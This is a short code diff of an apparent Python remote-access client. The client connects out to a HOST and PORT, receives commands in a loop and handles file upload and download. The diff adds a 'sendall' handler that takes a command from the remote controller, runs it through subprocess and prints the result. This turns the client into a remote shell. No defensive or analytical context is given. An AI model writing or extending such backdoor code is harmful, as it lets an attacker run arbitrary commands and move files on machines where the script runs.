@@ -23,6 +23,8 @@ def run_command(command:str):
     except subprocess.CalledProcessError as e:
         return f"Error executing command: {e.stderr.strip()}"
 
+
+
 def uploading_a_file(_request:str):
     words=_request.split()   
     print(words[1])
@@ -45,8 +47,6 @@ def uploading_a_file(_request:str):
 
 
 
-
-
 def downloading_a_file(_request:str):
     words=_request.split()
     print(words[1])
@@ -65,7 +65,11 @@ def downloading_a_file(_request:str):
     file.close()
 
 
-
+def sending_all(_request=str):
+    words=_request.split()
+    final_request=words[1]
+    output=run_command(final_request)
+    print(output)
 
 def background():
     client.connect((HOST,PORT))
@@ -73,6 +77,8 @@ def background():
     while True:
         request=client.recv(1024).decode('UTF-8')
         print(request)
+        if 'sendall' in request:
+            sending_all(request)
         if 'download' in request:
             downloading_a_file(request)
         if 'upload' in request:
